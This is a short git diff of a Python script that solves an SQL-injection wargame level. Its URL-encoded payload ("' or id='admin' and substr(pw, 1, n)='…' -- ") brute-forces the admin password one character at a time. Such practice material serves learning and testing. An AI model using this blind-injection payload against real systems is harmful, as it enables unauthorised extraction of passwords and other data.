@@ -1,6 +1,6 @@
 import urllib.request
 import requests
-from urllib.parse import quote # url encoding func
+from urllib.parse import quote  # url encoding func
 from time import sleep
 url = 'http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php'
 result = ""
@@ -30,7 +30,8 @@ for i in range(0, 10):
 
 for i in range(1, pwlen + 1):
     for j in range(ord('0'), (ord('z') + 1)):
-        add_url = "?pw=' or id='admin' and substr(pw, 1, {})='{}' -- ;".format(i, result + chr(j))
+        add_url = f"?pw=' or id='admin' and substr(pw, 1, {i})=\
+        '{result + chr(j)}' -- ;"
         query = url + quote(add_url)
 
         # if req(query).text.find('Hello admin') != -1:
